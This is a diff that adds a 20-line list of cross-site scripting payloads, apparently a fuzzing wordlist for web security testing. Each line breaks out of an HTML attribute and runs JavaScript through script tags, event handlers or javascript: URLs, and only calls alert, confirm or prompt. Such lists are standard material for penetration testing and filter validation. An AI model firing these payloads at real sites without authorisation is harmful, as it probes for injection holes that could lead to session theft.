@@ -1,0 +1,20 @@
+<script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><svg/onload=alert(1)>
+"><svg/onload=confirm(1)>
+"><script>confirm(1)</script>
+"><iframe src="javascript:alert(1)">
+"><body onload=alert(1)>
+"><img src="x" onerror="prompt(1)">
+"><svg><script>alert(1)</script>
+"><input onfocus=alert(1) autofocus>
+"><details open ontoggle=alert(1)>
+"><marquee onstart=alert(1)>
+"><object data="javascript:alert(1)">
+"><embed src="javascript:alert(1)">
+"><a href="javascript:alert(1)">click</a>
+"><meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+"><form onsubmit=alert(1)>
+"><button formaction="javascript:alert(1)">click</button>
+"><video src=_ onerror=alert(1)>
+"><audio src onerror=alert(1)>
